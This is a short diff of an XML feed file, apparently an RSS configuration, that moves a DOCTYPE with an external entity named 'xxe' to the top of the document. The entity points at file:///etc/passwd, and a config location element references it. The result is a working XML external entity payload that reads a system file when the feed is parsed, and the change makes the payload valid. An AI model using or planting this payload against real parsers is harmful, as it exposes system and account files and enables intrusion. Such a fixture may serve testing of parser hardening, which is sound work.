@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <rss version="2.0">
-  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <config>
     <location>&xxe;</location>
   </config>
